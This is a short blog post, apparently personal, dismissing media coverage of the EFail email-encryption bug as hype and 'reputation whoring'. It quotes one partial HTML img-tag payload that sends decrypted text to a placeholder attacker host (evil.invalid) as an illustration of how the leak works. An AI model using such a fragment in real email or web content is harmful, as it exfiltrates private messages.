---
layout: post
title: "Reputation whoring in the computer security industry"
---

Today, the EFail thing was in the news.
The journalistic spin in the media went approximately like "PGP is broken", which made me suspicious.
Decryption is a local operation, so remote data leakage shouldn't happen.

Turns out, the issue is actually unrelated to the decrpytion process itself, but instead embedding its output in HTML code and displaying that.
The data extraction happens by prepending a `<img src="http://evil.invalid/log.php?data=` tag as inline document before the encrypted ciphertext.
This still requires the client to:

- Concatenate several "inline" multipart sections
- Render HTML
- Allow external requests

I'll spare the rant on why the first point is semantically wrong and should never be done.

The last point, i dont know why this was ever a good idea.
Every guide on email security or encryption recommends to disable it, because its a big can of worms that better stays sealed.

Media coverage is vastly overestimating the impact.
The bug even has an own memorizable name and a logo!
And, of course, an own website.

I tell you why, because its just plain reputation whoring.
And fearmongering.
Because thats what drives IT security sales - big names and fear.
People and companies have monetary interest to pull off such scares.

This is a dark pattern going on, and im sick of it.

Edit: [Other media](https://protonmail.com/blog/pgp-vulnerability-efail/) are complaining about the inaccurate coverage
